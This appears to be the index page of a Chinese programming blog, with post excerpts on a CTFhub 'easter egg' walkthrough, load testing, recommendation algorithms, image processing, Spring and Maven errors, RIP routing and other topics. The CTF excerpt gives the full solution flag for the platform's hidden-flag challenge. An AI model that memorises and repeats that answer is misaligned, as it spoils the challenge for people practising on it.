<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="菜鸟程序员博客">
		<meta property="og:title" content="菜鸟程序员博客" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d819152f296e3eff404f482f72471f52/" rel="bookmark">
			CTFhub【彩蛋】部分技能树解题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CTFhub是最近找在线靶场刚发现的新靶场，做题需要积分，所以通过基础知识、签到、彩蛋部分可以快速获取一些积分。签到和基础知识都很简单，这里主要整理彩蛋部分题目。
这部分做完可以获得2430金币和140经验，接下来就可以在其它技能树里high了
1.首页
听说在首页的某个地方隐藏了一个flag，可能在*.ctfhub.com中，不妨先找到flag再来开题
题目意思是在首页找，第一反应是不是index主页，因为原始主页URL为www.ctfhub.com/#/index，尝试访问www.ctfhub.com/index.html之类路径无果，思考会不会和接口有关。最终访问api.ctfhub.com发展有正常回显
但界面上没有flag，所有查看网页源代码，找到了flag
二、 公众号
在CTFHub微信公众号上签到可获得更多金币。听说在微信公众号上也有个彩蛋，去看看吧
关注CTFHub公众号，发送flag即可。
三、 题目入口
在某个题目的入口上也有一个哦
暂时还没碰到，后续碰到再更新
四、writeup
writeup中也隐藏了一个呢
从首页点击Write Up跳转到Write Up界面
点击搜索，搜索flag，第一个egg下面的flag就是了
五、工具
工具中也隐藏了一个，不妨翻一翻？
首页中点击工具，搜索egg
点击 左下角眼睛符号发现会自动跳转到404界面，但是仔细观察URL会发现是重定向过去的。
通过burpsuite逐包放行找到跳转链接即可。
六、赛事
赛事中貌似也有哎
在主页的【赛事中心】，往下拉找到【赛事名称】，查询【egg】，egg比赛官网就是flag了。
七、真题
最后。来找找隐藏在真题中的彩蛋
在【历年真题】中搜索egg，名为egg的题目题干部分就是flag。可以查看源代码或者审查元素直接复制粘贴。
八、投稿提交
这次的彩蛋被不知名势力无情地打碎成好几块，现在只找到一块flag[0:6] = ctfhub，据说剩下的藏在了WP投稿和题目提交说明这里，不知名势力还留下了一句话：阅读的足够仔细就可以找到 Hint: WP投稿和提交说明在网站下方
题目中已经告诉了我们flag的第0-6位
点击CTFhub首页最下方的题目提交和WriteUp投稿
WriteUp投稿部分最下方隐藏的信息段落得知第6-12位
WriteUp投稿说明这个网页查看源代码，可以找到一串base64编码
base64解码得到flag%5B18%3A24%5D%20%3D%20%22e8c49b%22
把base64解码出的结果进行URL解码，得到第18-24位flag[18:24] = "e8c49b"
题目提交部分最下方隐藏的信息段落得知第12-18位
题目提交这个网页查看源代码可以找到一串密文
16进制转字符传得到24-30位 flag[24:30] = "1132b5"
把投稿说明网页的这张图片和题目提交界面的这张图片分别保存到本地，用记事本方式打开，获取到30-36位flag和36-42位flag
下载投稿说明界面的demo，打开后在files文件夹里有个egg_flag.txt
根据提示解密，得到42-48位
将获取到的48位flag组合到一起，得到完整flag
ctfhub{029e02eb3a1e8c49b1132b515b652a5f3a862013}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/395d0c042e561d2c9d105658dc943033/" rel="bookmark">
			并发模拟的四种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Postman
Postman 是一个款 HTTP 请求模拟工具
首先演示一下 Postman 最基本的使用，创建一个 Spring Boot 项目，测试的代码如下：
import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @RestController @RequestMapping("test") public class TestConrtoller { @GetMapping("demo") public String testDemo() { return "result~"; } } 为了便于操作，一般会将
http://127.0.0.1:8080 是经常使用的地址+端口号，可以设置为环境，点击右上角的设置图标
选择 global
输入信息
以后再进行测试就能这样搞简写了
知道基本使用之后，我们来看一下如何模拟并发测试
填写基本信息后，创建：
这个时候会创建出Concurrency的文件夹，我们可以把刚才测试的demo的例子放进这个文件夹下：
这个时候就可以在Concurrency下看到这个接口测试了
选择并发测试：
这个时候弹出我们想要的框了
点击 Run Concurrency
你可以立马感觉到 CPU 在“燃烧”，因为要记录并打印日志，显示的话是一条一条来的，其实测试的速度，要比你看到的打印的日志的速度快，绿色表示正常
二、Apache Bench（AB）
ApacheBench 是 Apache 服务器自带的一个web压力测试工具，简称ab。
ab又是一个命令行工具，对发起负载的本机要求很低，根据ab命令可以创建很多的并发访问线程，模拟多个访问者同时对某一URL地址进行访问，因此可以用来测试目标服务器的负载压力。总的来说ab工具小巧简单，上手学习较快，可以提供需要的基本性能指标，但是没有图形化结果，不能监控。
使用的话，首先需要安装 Apache 服务器
网站：传送门 http://httpd.apache.org/download.cgi
因为我的操作系统是 windows10， 这里选择 File for Microsoft Windows
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/395d0c042e561d2c9d105658dc943033/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e11fbc4bf7f30a4914ceac285aa47ef/" rel="bookmark">
			推荐算法之隐语义模型(LFM)矩阵分解梯度下降算法实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		推荐算法之隐语义模型(LFM)矩阵分解梯度下降算法实现 基于协同过滤的推荐一般分为基于近邻的推荐和基于模型的推荐，其中，基于近邻是指预测时直接使用用户已有的偏好数据，通过近邻数据来预测新物品的偏好。而基于模型的方法，是使用已知偏好数据来训练模型，找到内在规律，再用模型来做预测，类似于回归。
基于模型的方法，在训练时，可以基于标签内容来提取物品特征，可以让模型去发掘物品的潜在特征，这样的模型被称为隐语义模型(LFM)。
用隐语义模型进行协同过滤的目标：揭示隐藏的特征，这些特征解释为什么能给出预测的评分，这类特征可能无法直接用语言描述，但是我们知道有隐藏规律就可以。
协同过滤算法非常依赖历史数据，而一般的推荐系统中，偏好数据往往又是稀疏的，这就需要对原始数据做降维处理。一个大矩阵分解成两个矩阵相乘，分解之后的矩阵就代表用户和物品的潜在特征。
LFM降维方法：矩阵因子分解
假设用户的评分矩阵为R，现有m个用户，n个物品，我们要发现k个隐类，找到两个矩阵P和Q，使得两个矩阵的乘积近似等于R，即用户对物品的评分矩阵分解成了两个低维矩阵。
如下图所示，用户特征矩阵P的每一列都是用户的一个特征向量，电影特征矩阵Q的每一列都是物品的一个特征向量。
一个M×N的打分矩阵可以用两个矩阵P和Q的乘积来近似。
得到P和Q的乘积不再稀疏，之前的矩阵R也可以也可以由P和Q算出，这就得到了一个预测频分矩阵。
如果得到的预测评分矩阵于原来的评分矩阵在已知的评分位置上都近似，我们就可以认为预测位置上的值也是近似的。
模型的求解
现在得问题是怎样得到这样得分解方式P*Q呢，矩阵分解得到得预测矩阵与原评分矩阵在已知得评分项上可能有误差，我们得目标是找到一个最好得分解方式，让分解之后得预测评分矩阵总误差最小。
我们选取平方损失函数，并加入正则化项，防止过拟合
现在矩阵因子分解问题已经转换成了一个 标准得优化问题，需要求解P和Q使得目标损失函数取得最小值。
最小化求解得过程一般采用随机梯度下降法或者交替最小二乘法来实现。
交替最小二乘法(ALS):ALS得思想是由于两个矩阵P和Q都是未知，且通过矩阵乘法耦合到一起，为了使他们解耦 ，可以先固定Q，把P当作变量，通过损失函数最小化求出P，再反过来，固定P，把Q当作变量，求解处Q，如此交替执行，直到误差满足阈值条件或者达到迭代上限。
ALS具体求解过程：
以固定Q，求解P为例，由于每个用户u都是相互独立的，当Q固定的时候，用户特征向量Pu取得的值与其它用户特征向量无关，所以每个Pu都可以单独求解。
如下图所示，可以将u提出来，转换成一个等价的表达式。
那么令Lu(Pu)如下图所示，我们求其最小值即可。
我们对Pu求偏导，并令结果等于0，可得到如下表达式。
最终的化简过程如下所示：
我们主要还是学习用梯度下降的方法去求解隐语义模型。
梯度下降法也是损失函数求偏导，然后将偏导值乘以步长，带入梯度下降公式做迭代就可以。
#引入依赖 import numpy as np import pandas as pd #数据准备 #评分矩阵R R = np.array([[4, 0, 2, 0, 1], [0, 2, 3, 0, 0], [1, 0, 2, 4, 0], [5, 0, 0, 3, 1], [0, 0, 1, 5, 1], [0, 3, 2, 4, 1]]) ''' 输入参数： R：M×N的评分矩阵 K：隐特征向量的维度 max_iter:最大迭代次数 alpha:步长 lamda:正则化系数 输出： 分解之后的P,Q P:用户特征矩阵M*K Q：物品特征矩阵N*K ''' #给定超参数 K = 5 #维度设为5 max_iter = 5000 alpha = 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e11fbc4bf7f30a4914ceac285aa47ef/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e9e090ff9f6929174f8b912d2058664/" rel="bookmark">
			一文概括常用图像处理算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文总结了11种常用的图像处理算法，包含了预处理算法以及检测算法，并介绍了一些常用的开发库。
一、算法（预处理算法、检测算法） 在采集完图像后，首先会对图像进行预处理操作。保证图像的对比度清晰，水平。方便后续图像处理。
常用的图像处理算法：
1、图像变换 （空域与频域、几何变换、色度变换、尺度变换）
几何变换：图像平移、旋转、镜像、转置；
尺度变换：图像缩放、插值算法（最近邻插值、线性插值、双三次插值）；
空间域与频域间变换：由于图像阵列很大，直接在空间域中进行处理，涉及计算量很大。因此，有时候需要将空间域变换到频域进行处理。例如：傅立叶变换、沃尔什变换、离散余弦变换等间接处理技术，将空间域的处理转换为频域处理，不仅可减少计算量，而且可获得更有效的处理（如傅立叶变换可在频域中进行数字滤波处理）。
2、图像增强 图像增强不考虑图像降质的原因，突出图像中所感兴趣的部分。如强化图像高频分量，可使图像中物体轮廓清晰，细节明显；如强化低频分量可减少图像中噪声影响。
灰度变换增强（线性灰度变换、分段线性灰度变换、非线性灰度变换）；
直方图增强（直方图统计、直方图均衡化）；
图像平滑/降噪（邻域平均法、加权平均法、中值滤波、非线性均值滤波、高斯滤波、双边滤波）；
图像（边缘）锐化：梯度锐化，Roberts算子、Laplace算子、Sobel算子等；
3、纹理分析（取骨架、连通性） 4、图像分割 图像分割是将图像中有意义的特征部分提取出来，其有意义的特征有图像中的边缘、区域等，这是进一步进行图像识别、分析和理解的基础。
（1）阈值分割（固定阈值分割、最优/OTSU阈值分割、自适应阈值分割）;
（2）基于边界分割（Canny边缘检测、轮廓提取、边界跟踪）；
（3）Hough变换（直线检测、圆检测）；
（4）基于区域分割（区域生长、区域归并与分裂、聚类分割）；
（5）色彩分割；
（6）分水岭分割；
5、图像特征 （1）几何特征（位置与方向、周长、面积、长轴与短轴、距离(欧式距离、街区距离、棋盘距离)）；
（2）形状特征（几何形态分析（Blob分析）：矩形度、圆形度、不变矩、偏心率、多边形描述、曲线描述）；
（3）幅值特征（矩、投影）；
（4）直方图特征（统计特征）：均值、方差、能量、熵、L1范数、L2范数等；直方图特征方法计算简单、具有平移和旋转不变性、对颜色像素的精确空间分布不敏感等，在表面检测、缺陷识别有不少应用。
（5）颜色特征（颜色直方图、颜色矩）
（6）局部二值模式( LBP)特征：LBP对诸如光照变化等造成的图像灰度变化具有较强的鲁棒性，在表面缺陷检测、指纹识别、光学字符识别、人脸识别及车牌识别等领域有所应用。由于LBP 计算简单，也可以用于实时检测。
6、图像/模板匹配 轮廓匹配、归一化积相关灰度匹配、不变矩匹配、最小均方误差匹配
7、色彩分析 色度、色密度、光谱、颜色直方图、自动白平衡
8、图像数据编码压缩和传输 图像编码压缩技术可减少描述图像的数据量（即比特数），以便节省图像传输、处理时间和减少所占用的存储器容量。压缩可以在不失真的前提下获得，也可以在允许的失真条件下进行。编码是压缩技术中最重要的方法，它在图像处理技术中是发展最早且比较成熟的技术。
9、表面缺陷目标识别算法 传统方法：贝叶斯分类、K最近邻（KNN）、人工神经网络（ANN）、支持向量机（SVM）、K-means等；
10、图像分类（识别） 图像分类（识别）属于模式识别的范畴，其主要内容是图像经过某些预处理（增强、复原、压缩）后，进行图像分割和特征提取，从而进行判决分类。
11、图像复原 图像复原要求对图像降质的原因有一定的了解，一般讲应根据降质过程建立“降质模型”，再采用某种滤波方法，恢复或重建原来的图像。
二、现有的视觉检测软件/库 1、做工业视觉检测的公司有哪些？ 比较出名的有：大恒图像（亚洲Halcon最大代理商）、凌云光技术（VisionPro视觉平台：印刷、3C电子、显示屏、玻璃、线路板检测）、大族激光（振静系统：视觉激光焊接，定视觉位、缺陷检测）、康耐视、基恩士、深圳精锐视觉、深圳市视觉龙科技有限公司、广州超音速、深圳市创科自动化等等。
可二次开发的视觉系统：Labview、DVT、Halcon、OpenCV等。
2、常用的视觉检测软件/库 视觉开发软件工具 Halcon、VisionPro、LabView、OpenCV， 还有eVision、Mil、Sapera等。
（一）Halcon
底层功能算法多，运算性能快，功能齐全，容易上手，开发项目周期短。非开源项目，商用收费，价格较贵。
Halcon：Halcon是德国MVtec公司开发的一套完善的标准的机器视觉算法包，拥有应用广泛的机器视觉集成开发环境。它是一套image processing library，由一千多个各自独立的函数，以及底层的数据管理核心构成。其中包含了各类滤波，色彩以及几何，数学转换，型态学计算分析，校正，分类辨识，形状搜寻等等基本的几何以及影像计算功能。整个函数库可以用C，C++，C#，Visual basic和Delphi等多种普通编程语言访问。Halcon为大量的图像获取设备提供接口，保证了硬件的独立性。
（二）OpenCV
功能算法相对较多（比Halcon少），开源，可用于商用，开发周期较长（比Halcon长），有些算法要自己写。
OpenCV是一个基于（开源）发行的跨平台计算机视觉库，可以运行在Linux、Windows和Mac OS操作系统上。其核心轻量级而且高效——由一系列 C 函数和少量 C++ 类构成，实现了图像处理和计算机视觉方面的很多通用算法。OpenCV用C++语言编写，它的主要接口也是C++语言。该库也有大量的Python, Java and MATLAB/OCTAVE的接口，如今也提供对于C#, Ruby的支持。OpenCV可以在 Windows, Android, Maemo, FreeBSD, OpenBSD, iOS,Linux 和Mac OS等平台上运行。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e9e090ff9f6929174f8b912d2058664/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd496125886295bc293cc663f068968c/" rel="bookmark">
			【C&#43;&#43;】单例模式代码实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++实现单例模式 一、什么是单例模式 单例模式，是指一个类最多只能有一个实例化的对象。这个唯一对象并非在类的定义时就创建，而是在该类第一次被使用时才创建，有别于全局变量。
二、实现思路 1、一个类只能有一个实例化对象，因此要禁止类的用户在类外随意的new出来对象，或者直接定义一个对象。要保证这一点，我们自然想到将构造函数私有化。同时，将析构函数私有化，类的用户无法在类外直接delete该类的对象的指针。
class CSingleton { private: CSingleton(){ } ~CSingleton(){ } }; 2、类内定义一个静态私有成员变量，用来接收该类唯一对象的指针，类内定义，类外初始化为nullptr，并重写析构函数回收内存。
class CSingleton { private: CSingleton(){ } ~CSingleton() { if (m_MyInstancePtr != nullptr) { delete m_MyInstancePtr; m_MyInstancePtr = nullptr; } } static CSingleton* m_MyInstancePtr; }; CSingleton* CSingleton::m_MyInstancePtr = nullptr; 3、为类的用户创建接口，添加静态公有成员函数getInstance，置为static目的是用户可直接通过类名CSingleton::getInstance()调用该函数，无需通过类的对象来调用。用户调用该函数，若尚未存在实例化对象，则new一个对象，用m_MyInstancePtr接收其指针，并返回该指针；若已有实例化对象，则直接返回该唯一对象的指针m_MyInstancePtr。
class CSingleton { public: static CSingleton* getInstance() { if (m_MyInstancePtr == nullptr) m_MyInstancePtr = new CSingleton(); return m_MyInstancePtr; } private: CSingleton(){ } ~CSingleton() { if (m_MyInstancePtr !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd496125886295bc293cc663f068968c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e485c2557662ba6620b53a4a76fa7d9d/" rel="bookmark">
			2021-12-10 Json序列化出现 disable SerializationFeature.FAIL_ON_EMPTY_BEANS 问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Json序列化出现 disable SerializationFeature.FAIL_ON_EMPTY_BEANS 问题 disable SerializationFeature.FAIL_ON_EMPTY_BEANS 问题总结第三种方法 disable SerializationFeature.FAIL_ON_EMPTY_BEANS 问题 查询了一些文章有两种解决方案：
在每个需要使用 Jackson 序列化的对象上添加 @JsonIgnoreProperties(value = { “hibernateLazyInitializer”, “handler” }) 注解
在全局的 ObjectMapper 设置关闭 SerializationFeature.FAIL_ON_EMPTY_BEANS
总结 第一种：使用注解的方式要再每一个返回给前端需要使用 jackson 序列化对象上添加注解，比较繁琐第二种：设置 spring 容器中的对象关闭 SerializationFeature.FAIL_ON_EMPTY_BEANS，方便，但手动 new ObjectMapper 时需要重新设置两种方式各有好处，可以自行选择 第三种方法 后来又在 AxiosResult 对象添加了 get 方法，发现也能解决这个问题，可以不用使用前两种方式，查看下 SpringMVC 返回给前端的对象是否提供 get 方法
应该是 jackson 序列化如果没有提供 get 方法就会报 SerializationFeature.FAIL_ON_EMPTY_BEANS 这个问题（不能通过 get 方法获取成员变量）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1005ca7fad2837814d10c383457aa13f/" rel="bookmark">
			SpringBoot启动报循环依赖错误This is often the result of over-eager type matching - consider using
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错信息如下：
org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'areaCheckController': Unsatisfied dependency expressed through field 'areaCheckService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'areaCheckServiceImpl': Unsatisfied dependency expressed through field 'projectFileService'; nested exception is org.springframework.beans.factory.BeanCurrentlyInCreationException: Error creating bean with name 'projectFileServiceImpl': Bean with name 'projectFileServiceImpl' has been injected into other beans [asyncServiceImpl] in its raw version as part of a circular reference, but has eventually been wrapped. This means that said other beans do not use the final version of the bean.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1005ca7fad2837814d10c383457aa13f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e04fcb9f05a2416e4d688eee7e94a03e/" rel="bookmark">
			php使用sqlite(超简单版)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		php使用sqlite(超简单版) 一、直接上代码 查询：
public function select() { try { $maindir = 'D:\xxx.db'; $main = new \SQLite3($maindir); if (!$main) { echo 'code：' . $main-&gt;lastErrorCode(); echo 'Error：' . $main-&gt;lastErrorMsg(); $main-&gt;close(); die; } $sql = 'select * from 表名'; $result = $main-&gt;query($sql); while ($row = $result-&gt;fetchArray(SQLITE3_ASSOC)) { $arr = $row['字段名']; var_dump($arr); } $main-&gt;close(); } catch (\Exception $e) { if (isset($main)) { $main-&gt;close(); } var_dump($e-&gt;getMessage()); } } 添加：
public function insert() { try { $maindir = 'D:\xxx.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e04fcb9f05a2416e4d688eee7e94a03e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8eb0f77b9185161afd93b9b669fda143/" rel="bookmark">
			Cannot resolve plugin org.apache.maven.plugins:maven-compiler-plugin:3.1 Clean up the broken artifa
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		言简意赅，话不多说，直接上图： 记录一次创建maven项目的时候出现的bug，我以前也配过maven并没有遇到过这种问题，这回重新下载就出现这个问题了。我maven刚开始下的是3.8.4版本的也就是目前的最新版本，然后就出现了如上问题，而且我觉得我环境变量和settings.xml的配置以及IDEA整合maven的配置都没问题的，我还照着网上的大多数教程去修改阿里云镜像、关闭内网连热点、等方式都没用。我还以为是版本问题，就降级成了3.6.3，还是不行，之后我换成了3.5.4就可以了，然后我很纳闷不应该是版本问题哇，不然官方推出来干嘛呢。
重点来了？ 其实是文件夹不能带空格和特殊符号的原因，因为我当时命名3.6.3和3.8.4的时候文件夹名字里有空格，当时并没有在意，而3.5.4我没有空格，所以可以拉jar包。我还把3.6.3重新放到了个位置，配了环境变量和本地仓库，修改了idea的配置，发现也成功了，所以大家以后切记这些命名规范哦！ 如果这篇文章有帮助到你，请给我一个大大的赞，让我知道有多少和我经历相同bug的小伙伴！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b1b52a7fcd9b9df07f53e2d3bbad3dc/" rel="bookmark">
			动态路由———RIP协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		RIP 动态路由动态路由特点动态路由协议概述度量值静态路由和动态路由比较RIPRIP的基本概论RIP度量值为跳数RIP更新时间启动RIP v1宣告直网段查看路由表查看RIP广播启动RIP v2关闭RIPv2路由自动汇总RIPv1 特点RIP v2 特点汇总 动态路由 动态路由不需要手动配置路由
路由器之间可以相互学习
基于某种路由协议实现
动态路由特点 减少管理
占用了网络带宽
动态路由协议概述 路由器之间用来交换信息的语言
度量值 跳数，带宽，负债，时延，可靠性，成本
静态路由和动态路由比较 网络中静态路由和动态路由相互补充
距离失量型路由协议
RIP E2GRP–距离失量型
OSPE–IS IS 链路状态型
RIP的基本概论 定制更新 每30s更新一次
邻居 运行RIP协议的其他路由
广播更新 RIPv1
组播更新PIPV2
全路由表更新
RIP度量值为跳数 最大跳数为15跳，16跳为不可用
RIP更新时间 每隔30s发送路由更新消息UDP520端口
执行水平分割可以阻止路由器的干路的发生从一个接口学习到路由信息，不再从这个接口发送出去同时也能减少路由更新信息占用的链路带宽资源
启动RIP v1 R1(config)#router rip
宣告直网段 R1(config-router)#network 10.0.0.0（已主类型网络方式宣告）
查看路由表 R1#show ip route
查看RIP广播 R1#debug ip
启动RIP v2 R1(config)#router rip
R1(config-router)#version 2
关闭RIPv2路由自动汇总 R1(config-router)#no auto-summary
RIPv1 特点 有类路由协议
广播更新·（255.255.255.255）
不支持vlsm
自动路由汇总不可关闭
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b1b52a7fcd9b9df07f53e2d3bbad3dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a40fcc2b695511b50ad56e874658a47d/" rel="bookmark">
			设计一个支持 push ，pop ，top 操作，并能在常数时间内检索到最小元素的栈
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目：
设计一个支持 push ，pop ，top 操作，并能在常数时间内检索到最小元素的栈。
push(x) —— 将元素 x 推入栈中。
pop() —— 删除栈顶的元素。
top() —— 获取栈顶元素。
getMin() —— 检索栈中的最小元素。
示例:
输入：
["MinStack","push","push","push","getMin","pop","top","getMin"]
[[],[-2],[0],[-3],[],[],[],[]]
输出：
[null,null,null,null,-3,null,0,-2]
解释：
MinStack minStack = new MinStack();
minStack.push(-2);
minStack.push(0);
minStack.push(-3);
minStack.getMin(); --&gt; 返回 -3.
minStack.pop();
minStack.top(); --&gt; 返回 0.
minStack.getMin(); --&gt; 返回 -2.
提示：
pop、top和getMin操作总是在非空栈上调用。
思路：
预设两个栈，左边栈负责接收元素，右边栈负责存最小元素元素入左边栈，入栈时比较左右栈顶元素，如果新元素小，把新元素放在右边的栈顶位置，如果新元素大，则把右边栈顶元素还放在栈顶的位置出栈时，出入栈的最后一个元素，也就是左边栈顶元素出最小值时，出右边栈顶元素出栈时两个都得出 代码：
Java：
class MinStack { public: /** initialize your data structure here. */ MinStack() { } void push(int x) { left.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a40fcc2b695511b50ad56e874658a47d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b33d5245d7f3f10ff4258a3ba5280e0a/" rel="bookmark">
			使用同源建模预测蛋白质结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是蛋白质？ 蛋白质是大的生物分子，负责执行生物体细胞内的大部分功能，包括对刺激作出反应、作为其他反应的催化剂、将分子从一个地方运输到另一个地方以及执行细胞信号传导。就像 DNA 序列一样，蛋白质序列是一串分子，但与 DNA 序列不同的是，有20种不同的称为氨基酸的分子构成了蛋白质序列。
更多内容欢迎关注公众号：生信技术
蛋白质结构 每个1D 蛋白质序列串都折叠成3D 结构。这些 3D 蛋白质结构决定了蛋白质如何响应各种环境以及它与哪些其他分子相互作用，因此对于蛋白质执行其功能的能力至关重要。蛋白质的 3D 结构是通过提供蛋白质中每个原子在3D 空间中的坐标 (xyz)来描述的。
确定蛋白质结构 可以使用X 射线晶体学和核磁共振 (NMR)等实验程序确定蛋白质结构。
然而，这些技术缓慢且繁琐，并且不能应用于所有蛋白质。因此，高通量计算方法用于从序列预测蛋白质的 3D 结构。
同源建模 蛋白质结构预测最流行的计算方法之一是同源建模。
同源建模利用蛋白质结构的进化保守性来预测蛋白质的 3D 结构。从相同的共同祖先（同源性）进化而来的两种蛋白质往往具有相似的 3D 结构。
在同源建模中，这种蛋白质结构保守性的特性用于预测新发现的蛋白质序列的结构，这些蛋白质序列的结构无法使用传统的实验方法解析。
其主要思想是根据蛋白质序列数据库搜索未知结构的蛋白质序列，其中所有蛋白质的结构在实验上都是已知的，未知结构是根据数据库中进化上最接近或最匹配的蛋白质建模的。
在这篇文章中，我们描述了同源建模的方法，即它是如何工作的。我们还描述了如何使用 SWISS-MODEL 工具进行同源建模。
同源建模方法详解 在本节中，我们将概述同源建模所涉及的步骤。请注意，其中许多步骤是活跃的研究领域。
前面提到过，同源性建模始于对许多蛋白质的结构及其序列的了解，这些结构已通过实验方法确定。该方法使用这些先前的知识来预测我们知道序列但还不知道 3D 结构的蛋白质的结构。
为了预测蛋白质的结构，我们将首先预测 N、Ca、Cb（骨架）的坐标，然后是每个氨基酸的 R 基团（侧链）的坐标。
(一) 模板识别和初始对齐 首先，我们找到进化上最接近目标的蛋白质（我们希望预测其结构的蛋白质）。
这是使用数据库搜索算法实现的，例如 BLAST（基本局部比对搜索工具），该算法执行目标序列与蛋白质序列数据库的序列比对。
PDB（蛋白质数据库）就是这样一种数据库。数据库中与我们的目标最匹配的蛋白质序列被认为是进化上最接近的，其结构将用作目标结构模型的模板。数据库搜索工具还给出了一个比对，即目标的哪些区域匹配模板的哪些区域的信息。
(二) 对齐校正 在数据库搜索期间获得的目标和模板之间的初始比对在比对的某些困难区域中可能不是最佳的。例如，初始比对可能违反某些氨基酸替换规则，例如用蛋白质核心中的疏水残基替换亲水残基。
鉴于我们已经找到了一个初始模板，我们现在可以使用更严格的对齐算法来找到更好的对齐方式。例如，我们可以在这一步使用多个序列比对算法。多序列比对可用于识别高度不同的区域，从而更好地检测插入和删除的适当位置。
(三) 骨干生成 优化目标模板比对后，生成目标的蛋白质骨架结构（N-Ca-Cb）。
这是通过基于对齐简单地将模板主干的坐标复制到目标来实现的。也就是说，目标蛋白质中原子的坐标与模板蛋白质中相应原子的坐标相同，如上一步的比对所述的那样。
这个过程高度依赖于模板结构的准确性，我们初始数据库中的任何错误都会导致我们预测的错误。
(四) 循环建模 主干步骤不处理对齐中存在的两种类型的不匹配，即插入和删除。将这些不匹配合并到主干中是同源建模中最困难的部分。
蛋白质的二级结构由螺旋、链和环(helices, strands and loops)组成。由于插入和删除所暗示的构象变化不能发生在螺旋和链中，它们必须发生在环中。
建模循环有两种主要方法：基于已知和基于能量。前一种方法在已知结构的数据库中搜索与目标具有相似序列和端点的环的构象。后者通过使用力场函数和分子动力学预测具有最低结构能量的环结构，以从头开始的方式对环构象进行建模。这些方法为最多 5-8 个残基的短环提供了相当准确的结果。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b33d5245d7f3f10ff4258a3ba5280e0a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29c2b0891b47b9ac536798553c1725d3/" rel="bookmark">
			python列表self append无限嵌套的原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		示例一：
self append 形成无限嵌套原理：
